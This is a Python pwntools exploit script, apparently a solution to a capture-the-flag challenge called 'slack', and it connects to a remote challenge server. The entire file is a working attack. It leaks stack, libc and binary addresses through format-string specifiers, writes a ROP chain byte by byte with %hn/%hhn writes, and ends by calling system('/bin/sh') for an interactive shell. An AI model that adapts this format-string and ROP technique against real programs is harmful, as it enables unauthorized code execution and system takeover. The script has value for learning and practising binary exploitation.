from pwn import *

#io = process('./slack')
io = remote('challs.actf.co', 31500)
libc = ELF('./libc.so.6')
elf = ELF('./slack')

stack = 0

def preset():
    global stack
    io.sendlineafter(b'Professional): ', b'%25$p')
    io.recvuntil(b'You: ')
    stack = int(io.recvline(), 16) - 0x180 + 3
    log.info('!?! - {}'.format(hex(stack)))
    io.sendafter(b'Professional): ', '%{}c%25$hn'.format(stack & 0xffff).encode())
    io.sendlineafter(b'Professional): ', '%{}c%55$hn'.format(0x80).encode())

def w(off, val):
    _ = 0
    io.sendafter(b'Professional): ', '%{}c%25$hn'.format((off & 0xffff)+_).encode()) 
    io.sendlineafter(b'Professional): ', '%{}c%55$hhn'.format((val >> 8*_) & 0xff).encode()) 
    _ +=1
    io.sendlineafter(b'Professional): ', '%{}c%25$hhn'.format((off & 0xff)+_).encode()) 
    io.sendlineafter(b'Professional): ', '%{}c%55$hhn'.format((val >> 8*_) & 0xff).encode())
    _ +=1
    io.sendlineafter(b'Professional): ', '%{}c%25$hhn'.format((off & 0xff)+_).encode()) 
    io.sendlineafter(b'Professional): ', '%{}c%55$hhn'.format((val >> 8*_) & 0xff).encode())
    _ +=1
    io.sendlineafter(b'Professional): ', '%{}c%25$hhn'.format((off & 0xff)+_).encode()) 
    io.sendlineafter(b'Professional): ', '%{}c%55$hhn'.format((val >> 8*_) & 0xff).encode())
    _ +=1
    io.sendlineafter(b'Professional): ', '%{}c%25$hhn'.format((off & 0xff)+_).encode()) 
    io.sendlineafter(b'Professional): ', '%{}c%55$hhn'.format((val >> 8*_) & 0xff).encode())
    _ +=1
    io.sendlineafter(b'Professional): ', '%{}c%25$hhn'.format((off & 0xff)+_).encode()) 
    io.sendlineafter(b'Professional): ', '%{}c%55$hhn'.format((val >> 8*_) & 0xff).encode())

def pwn():
    global stack
    io.sendlineafter(b'Professional): ', b'%21$p%23$p')
    io.recvuntil(b'You: ')
    _ = io.recvline().split(b'0x')
    libc.address = int(_[1], 16) - 128 - 0x29d10
    elf.address = int(_[2], 16) - elf.sym['main']
    log.info('libc: '+hex(libc.address))
    log.info('elf: '+hex(elf.address))
    pop_rdx_rbx = libc.address + 0x90529
    pop_rsi = libc.address + 0x2be51
    pop_rdi = libc.address + 0x2a3e5 
    stack += 0x6d
    log.info('!?! - {}'.format(hex(stack)))
    w(stack, pop_rdi)
    w(stack+8, stack+0x10)
    w(stack+8*2, libc.sym['gets'])
    stack-=0x6d
    io.sendafter(b'Professional): ', '%{}c%25$hn'.format(stack & 0xffff).encode())
    io.sendlineafter(b'Professional): ', '%{}c%55$hn'.format(1).encode())
    pl = b'AAAAAAAA'
    pl += p64(pop_rdi)
    pl += p64(next(libc.search(b'/bin/sh')))
    pl += p64(libc.sym['system'])
    io.sendline(pl)


preset()
pwn()
io.interactive()
